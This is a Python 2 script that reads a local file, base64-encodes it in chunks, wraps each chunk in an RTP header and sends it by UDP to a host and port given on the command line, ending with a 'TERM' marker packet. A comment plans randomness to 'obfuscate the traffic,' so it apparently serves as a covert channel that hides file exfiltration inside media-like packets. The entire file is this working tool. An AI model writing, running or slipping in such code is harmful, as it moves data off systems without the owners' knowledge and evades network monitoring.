import socket
import base64
import sys
from rtp_packet import RtpPacket

def construct_rtp(payload, payload_type, frame_nr):
    version = 2
    padding = 0
    extension = 0
    cc = 0
    marker = 0
    pt = payload_type
    seq_num = frame_nr
    ssrc = 0
    rtp_packet = RtpPacket()
    rtp_packet.encode(version, padding, extension, cc, seq_num, marker, pt, ssrc, base64.b64encode(payload))
    return rtp_packet.get_packet()


def read_file(file_name):
    with open(file_name, 'r') as f:
        payload = f.read()
        return payload


# Splits payload into even chunks.
# todo implement some randomness later to obfuscate the traffic.
def split_payload(payload, chunk_size):
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    return chunks


# todo type check
# chunk_size should not be bigger than the message buffer on the server.
def send_to_server(ip, port, file_name, payload_type, chunk_size=100):
    print chunk_size
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = read_file(file_name)
    chunks = split_payload(payload, chunk_size)

    # Sequence counter makes sure that packets are received in good order.
    sq_count = 0
    for c in chunks:
        rtp_packet = construct_rtp(c, payload_type, sq_count)
        s.sendto(rtp_packet, (ip, port))
        sq_count += 1

    # Send termination sequence so server knows message has ended.
    s.sendto(construct_rtp("TERM", payload_type, sq_count), (ip, port))


if __name__ == "__main__":

    send_to_server(sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]), int(sys.argv[5]))
